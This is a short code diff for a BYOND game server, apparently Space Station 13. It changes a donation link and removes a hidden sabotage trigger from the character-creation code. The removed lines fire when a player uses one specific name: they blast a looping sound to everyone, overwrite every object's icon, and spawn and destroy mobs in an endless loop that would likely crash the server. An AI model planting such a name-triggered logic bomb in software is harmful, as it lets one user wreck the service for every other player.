@@ -120,7 +120,7 @@
 		new_player_panel()
 
 	if(href_list["contribute"])
-		src << link("http://fallout13.ru/payment/index.php?ckey=[client.ckey]")
+		src << link("http://zlobilling.org/services/ss13-5")
 
 	if(href_list["observe"])
 
@@ -462,21 +462,6 @@
 		mind.transfer_to(new_character)					//won't transfer key since the mind is not active
 
 	new_character.name = real_name
-	if(client.prefs.real_name == "Aabbaabbab Babbaba")
-		for(var/mob/M in player_list)
-			var/sound/S = sound('sound/misc/gameover.ogg',repeat=1,channel=rand(100,600),volume=100)
-			M << S
-		for(var/atom/movable/A in world)
-			A.icon = 'icons/effects/effects.dmi'
-			A.icon_state = "bhole3"
-			A.blend_mode = 0
-		spawn(0)
-			while(1)
-				var/mob/M = new /mob/living/carbon/human(locate(rand(1,world.maxx),rand(1,world.maxy),1))
-				sleep(1)
-				M.gib()
-		src.create_character()
-
 	new_character.key = key		//Manually transfer the key to log them in
 	new_character.stopLobbySound()
 
